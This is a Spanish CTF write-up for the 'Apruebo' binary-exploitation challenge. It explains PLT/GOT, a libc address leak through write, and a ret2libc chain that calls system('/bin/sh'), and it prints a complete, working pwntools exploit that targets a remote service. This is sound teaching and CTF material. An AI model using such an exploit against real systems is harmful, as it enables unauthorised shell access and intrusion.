---
layout: posts
title: "CuarenTeFa Apruebo Writeup"
categories: [writeups]
tags: [writeup, binexp, rop, ret2libc]
---

Acá dejo mi writeup para el challenge "Apruebo" hecho por [dplastico](https://dplastico.me/) para el CTF CuarenTeFa del 21 de Marzo de 2020 organizado por [L4tinHTB](https://t.me/joinchat/GgG8nxC3jHVwxNFeyQt_OA).

El desafío pertenecía a la categoría PWN y tenia un valor de 300 puntos (súbanle el puntaje a PWN!), y fue resuelto solamente por dos participantes. En este writeup voy a explicar detalladamente todos los procesos por los que se tiene que pasar para lograr un exploit exitoso, introduciendo el ataque ret2libc, los memory leaks y como este funciona relacionado a la PLT y GOT.

[separator]: <> ()

Al día siguiente del CTF los organizadores hicieron un live resolviendo todos los challenges, pero la solución aun no esta publicada en YouTube al momento en que escribo este writeup. Los métodos usados en su solución y en la mía son prácticamente los mismos solo que el autor implementó herramientas automáticas y yo aquí voy a hacerlo todo manual y explicado paso a paso para que se entienda :D.

## Apruebo
Como en la mayoría de desafíos PWN, comenzamos con un archivo zip y una IP y puerto a los que nos podemos conectar. El objetivo en este challenge va a ser explotar un Buffer Overflow en el binario que se nos da para poder conseguir una shell en la maquina remota y así poder leer la flag.
[Aquí](/downloads/Apruebo.7z) tienen un link donde pueden descargar el archivo, y pueden emular la situación del binario corriendo en una maquina remota ustedes mismos haciendo ```nc -nvlp 5555 -e apruebo``` y tendrán el servicio corriendo en ```127.0.0.1:5555```.

![](/assets/images/content/cuarentefa/Inicio.png)

Descomprimimos el zip, cambiamos los archivos a modo ejecutable y estamos listos para empezar.
Vemos que tenemos un binario y una libc, asumimos que es la libc de la maquina remota que nos es entregada para poder conseguir direcciones y demás. Al correr el binario, este espera nuestro input y luego printea `Q4{CTF2020}!`, una distracción por parte del creador del desafío a una flag del estilo Q4{} usadas en un CTF pasado.
Hacemos el comando `file` con el archivo para ver si se trata de un binario de 32 o 64 bits:

![](/assets/images/content/cuarentefa/file.png)

y luego hacemos `checksec` para identificar las protecciones que tiene:

![](/assets/images/content/cuarentefa/checksec.png)

Vemos que la única protección que tiene el binario es NX. No podremos ejecutar un simple buffer overflow con shellcode ya que la proteccion NX hace que el stack no sea ejecutable. Tendremos que optar entonces por una [ROP Chain](https://ropemporium.com/guide.html) para poder obtener una shell.
Comenzamos reverseando brevemente el binario para hacernos una idea de lo que hace. Para esto vamos a usar radare2:

![](/assets/images/content/cuarentefa/radare-beginning.png)

Vemos 2 funciones que nos podrían interesar por ahora: `main` y `vuln`.
`Main`:

![](/assets/images/content/cuarentefa/radare-main.png)

Tomando una mirada mas cercana a `main` nos damos cuenta de que lo único que hace es llamar a `vuln` y luego printear algo al stdout mediante la función `write`, que podemos asumir seguramente es el `Q4{CTF2020}!` que vimos al ejecutar el binario. 

Pasamos a mirar la función `vuln`. Esta nos interesa mas:

![](/assets/images/content/cuarentefa/radare-vuln.png)

Vemos una llamada a la función `read`, que es la función que nos pide el input inicialmente al correr el binario. Es esta función la que vamos a usar para empezar nuestro exploit, es decir, la que vamos a overflowear.

Suficiente reversing, pasamos a ver como crashear el binario y a construir nuestro exploit. Abrimos el binario en gdb (con el plugin peda):

![](/assets/images/content/cuarentefa/pattern-create.png)

Creamos una string de 200 caracteres con patron identificable para luego poder saber donde tenemos el offset para sobreescribir el EIP

![](/assets/images/content/cuarentefa/pattern-offset.png)

Podemos comprobar esto en la terminal con python:

![](/assets/images/content/cuarentefa/pythoncrash.png)

Efectivamente crasheamos el programa, usando el comando `dmesg` podemos analizar por que ocurrió el crash:
```
[ 6185.322908] apruebo[11718]: segfault at 41414141 ip 0000000041414141 sp 00000000ff974fb0 error 14 in libc-2.29.so[f7d7e000+1d000]
[ 6185.322915] Code: Bad RIP value.
```
Vemos que 4 bytes sobreescribieron el EIP, causando el crash. Estos 4 bytes son los que introdujimos con el comando de python, ya que printeamos 144 en vez de 140 para lograr el crash.

Con esta información empezamos a construir nuestro exploit.
Para este challenge vamos a usar `pwntools`, una librería para exploiting en python muy util.
Nuestro exploit va quedando así:

```python
#!/usr/bin/python
from pwn import *

p = process("./apruebo") # Definimos el binario que vamos a explotar
#p = gdb.debug("./apruebo") # Muy util para debuggear

junk = "A"*140

payload = junk

p.sendline(payload)
```

Nuestro objetivo va a ser sobreescribir el eip para poder ejecutar la función que queramos. En este caso vamos a llamar a `write` con algunos argumentos especiales para leakear la dirección base de libc en la memoria, que no es fija debido a que el sistema tiene ASLR (Address Space Layout Randomization). Desde ahi, teniendo la direccion base de libc, vamos a poder llamar a `system` con `/bin/sh` para conseguir una shell y completar el challenge.

Entonces ahora tenemos que conseguir algunas direcciones para poder ejecutar nuestro exploit. Nuestra payload, por ahora, necesita lo siguiente:

- `140 bytes de padding para sobreescribir el EIP` - Conseguido
- Dirección de la función `write` para ejecutar el memory leak,
- Direcciones para los parámetros de la función `write`, necesarios para el memory leak también.

#### Memory leak
Para llevar a cabo un memory leak de la dirección de libc necesitamos entender primero los conceptos de PLT y GOT. Creo que [este video de LiveOverflow](https://youtu.be/kUk5pw4w0h4) hace un muy buen trabajo explicándolos, pero esta en inglés así que voy a hacer lo mejor que pueda para explicarlos en este writeup.
Reverseando el binario vimos que las funciones `write` y `read` eran llamadas en determinados puntos de la ejecución. Pero a diferencia de las funciones `main` y `vuln`, que están "dentro" del binario, `write` y `read` son funciones externas importadas desde la libc.
Esto es implementado en la mayoría de binarios desde hace muchísimo tiempo, ya que ahorra mucho trabajo, espacio y velocidad. Entonces, como se llama a estas funciones si no están dentro del binario? Volvemos un poco a radare2 para analizarlo. 

![](/assets/images/content/cuarentefa/radare-functions.png)

Vemos que las funciones `write` y `read` son simplemente instrucciones `jpm` a otra dirección. Si las analizamos en conjunto, corriendo el comando `V @ sym.imp.read` y subiendo  un poco, nos podemos dar cuenta de que ambas son simplemente entradas de la PLT, o Procedure Linkage Table.

![](/assets/images/content/cuarentefa/radare-plt.png)

Esto significa que las direcciones fijas que tiene el binario de las funciones externas son saltos a otra dirección. Ahora veamos que hay en estas otras direcciones: 

![](/assets/images/content/cuarentefa/radare-got.png)

Vemos el inicio de una sección llamada .got, o Global Offset Table. Es en esta sección donde los binarios establecen un link entre sus llamadas a funciones externas y las funciones mismas en libc. En la GOT podemos ver instrucciones `reloc.` con las funciones. `.reloc` significa "relocalización",  y es básicamente lo que ocurre en la GOT. La GOT siempre va a tener una dirección fija dentro de la memoria del binario, pero proporciona un link a las direcciones no fijas de las funciones al cargarse la libc a la memoria cuando se corre el binario. Cada vez que se corre el binario la libc toma una direccion diferente determinada aleatoriamente, como podemos ver en la siguiente imagen:
![](/assets/images/content/cuarentefa/libcrandom.png)

Lo que hace la GOT cuando se corre el binario es almacenar esta dirección aleatoria en un lugar donde el binario pueda accederla, para que asi las funciones externas puedan ser llamadas. Esto plantea una vulnerabilidad ya que si se logra tener acceso a las direcciones de la GOT, se puede llegar a filtrar la dirección aleatoria de libc, dejando de lado entonces la protección ASLR y dando lugar a la ejecución de prácticamente lo que sea desde la libc.
Lo que buscamos entonces es acceder a estas direcciones en la GOT. Como hacemos esto? Podemos utilizar la función `write`, llamándola desde su dirección en la `PLT`, para printear para nosotros mismos lo que haya en la localización de `read@GOT`, que nos llevaría posteriormente a `read@libc`. Con esta ultima dirección podríamos calcular la dirección base de libc, y desde ahí ejecutar lo que se nos de la gana.
Pasemos ahora a la practica.

Necesitamos la direccion de `write@PLT` y de `read@GOT`. Podemos sacar ambas corriendo los siguientes comandos respectivamente:
`objdump -D apruebo | grep write`, obteniendo `0x08049050`. La `-D` es para desensamblar el binario.
`objdump -R apruebo | grep read`, obteniendo `0x0804c00c`. La `-R` es para ver las relocalizaciones dinámicas del binario, es decir, las direcciones de la GOT.

[Aquí](http://man7.org/linux/man-pages/man2/write.2.html) tenemos la manual page de la función `write`. Podemos ver que la función requiere 3 parámetros: `int fd`, que en nuestro caso seria `1` ya que queremos que nos printee el output a `stdout`; luego tenemos lo que queremos printear, que aquí seria el contenido de `0x0804c00c (read@GOT)`, y luego tenemos la cantidad de bytes que queremos printear, en nuestro caso 4. Pero al llamar a `write` de esta manera, en un binario ya compilado, necesitamos un parámetro mas: el de la dirección de retorno. Esta es la direccion a la que queremos que vuelva la ejecución del binario luego de que llamemos a `write`. Queremos que sea un punto desde el que podamos retomar la explotación luego de haber conseguido las direcciones de libc, es decir, una dirección que nos lleve de nuevo a la función `vuln`, para retomar el flow del exploit. En este caso nos sirve algo tan simple como la dirección de `main`, ya que desde aqui se llama a `vuln` y sirve para nuestro propósito. Podemos hacer un simple `objdump -D apruebo | grep main` para obtener `0x080491a7`.

Tenemos entonces un poco mas formada nuestra llamada a `write` para leakear la direccion de libc, y con ella nuestro exploit va quedando asi:

```python
#!/usr/bin/python
from pwn import *

p = process("./apruebo") # Definimos el binario que vamos a explotar
#p = gdb.debug("./apruebo") # Muy util para debuggear

junk = "A"*140

plt_write = p32(0x08049050)
got_read = p32(0x0804c00c)
main = p32(0x080491a7)

payload = junk + plt_write + main + p32(0x01) + got_read + p32(0x04)

p.sendline(payload)
```
Todo tiene que estar en formato `little endian` y completado para los 4 bytes que caracterizan a los 32bits, por lo que usamos la función de pwntools `p32()` para convertir nuestras direcciones según estas necesidades.
Con esta payload ya deberiamos ser capaces de leakear la direccion de `read@libc`. Nos falta un poco de codigo para poder obtener e incorporar nuestro leak:
```python
leak = u32(p.recv())
log.info("read@libc: " + hex(leak))
```
Esto nos permite recibir el leak que nos da write y lo ponemos en un formato en el que lo podamos leer (hex()).

Si ejecutamos nuestro exploit varias veces, nos damos cuenta de que la dirección que leakeamos cambia cada vez. Ahora que tenemos la dirección de `read@libc` necesitamos calcular la dirección base de libc. Para hacer esto podemos usar la direccion de `read` en nuestra libc y restarsela a nuestro leak, para así llegar a la dirección base de libc.
Hacemos `ldd apruebo` para obtener el path de nuestra libc: `/lib/i386-linux-gnu/libc.so.6`. Ahora, para obtener la dirección de`read`, hacemos `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep read@` y buscamos la de `read@@GLIBC_2.0` obteniendo`0x000ea3a0`. Esta dirección puede variar dependiendo del sistema operativo o la versión de libc de cada uno.
La incorporamos a nuestro exploit y llevamos a cabo las operaciones necesarias para llegar a la direccion base de libc:
```python
libc_read = 0x000ea3a0
libc_base = leak - libc_read

log.info("Base de libc: " + hex(libc_base))
```

Ahora que tenemos la direccion base de libc podemos pasar a la segunda etapa de nuestro exploit: llamar a `system` con `/bin/sh`. Para esto necesitamos las siguientes direcciones que pueden ser obtenidas mediante los siguientes comandos:

- `system@libc` | Comando:  `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep system`
Obtenemos `0x00042660`
- `/bin/sh@libc` | Comando: `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`
Obtenemos `0x17ff68`
- `exit@libc` | Comando:  `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep exit`
Obtenemos `0x000356f0`

Ahora las incorporamos a nuestro exploit y hacemos los debidos cálculos para poder usarlas correctamente dentro de la ejecución de nuestro binario:

```python
system = libc_base + 0x00042660
bin_sh = libc_base + 0x17ff68
exit = libc_base + 0x000356f0
```
Y ahora es momento de lanzar nuestro segundo payload. Recordamos que al llamar a `write` para hacer el memory leak usamos a `main` como return address, por lo que es como si hubieramos corrido el binario de nuevo, es decir, tenemos que introducir nuestros 140 bytes de padding y todo como si fuese un exploit desde 0. El final de nuestro exploit queda así:


```python
payload = junk + p32(system) + p32(exit) + p32(bin_sh) # Aclaración del orden de los argumentos: system(ret addr, cmd)

p.sendline(payload)
p.interactive()
```

Ahora corremos el exploit y... obtenemos una shell!!

![](/assets/images/content/cuarentefa/localshell.png)

Ya tenemos el challenge practicamente resuelto! Solo que lo hicimos localmente y, obviamente, no tenemos ninguna flag aquí :/.
Lo que faltaria seria correrlo remotamente, y para eso solamente hay que reemplazar las direcciones obtenidas de la libc (libc_read, libc_system, libc_binsh, libc_exit) con las que obtendriamos de la libc que se nos da con el challenge. Despues de eso bastaria modificar el exploit un poco para hacerlo correr en un servicio remoto, de la siguiente manera:
```python
p = remote("x.x.x.x", 5555)
```
Emulando el servicio localmente, como indicado al comienzo del writeup, vemos que conseguimos una shell:

![](/assets/images/content/cuarentefa/remoteshell.png)

El exploit final nos queda así:

```python
#!/usr/bin/python
from pwn import *

#p = process("./apruebo")
#p = gdb.debug("./apruebo", "b main")
p = remote("127.0.0.1", 5555)

junk = "A"*140

plt_write = p32(0x08049050)
got_read = p32(0x0804c00c)
main = p32(0x080491a7)

payload = junk + plt_write + main + p32(0x01) + got_read + p32(0x04)

p.sendline(payload)

leak = u32(p.recv())
log.info("read@libc: " + hex(leak))

libc_read = 0x000ea3a0
libc_base = leak - libc_read

log.info("Base de libc: " + hex(libc_base))

# Direcciones de libc, al correr exploit remotamente
# recordar reemplazar por las del libc del challenge.
system = libc_base + 0x042660
bin_sh = libc_base + 0x17ff68
exit = libc_base + 0x000356f0 

payload = junk + p32(system) + p32(exit) + p32(bin_sh)

p.sendline(payload)
p.interactive()
```

Gracias por dedicarle su tiempo a este challenge y a este writeup! Gracias tambien a los organizadores por el CTF, estuvo bueno! Se aprecia mucho el feedback, tienen aqui en la web algunas de mis redes sociales para contactarme, tambien estoy en los grupos de telegram como c4e así que cualquier duda o mensaje tambien pueden hablarme por ahi. 
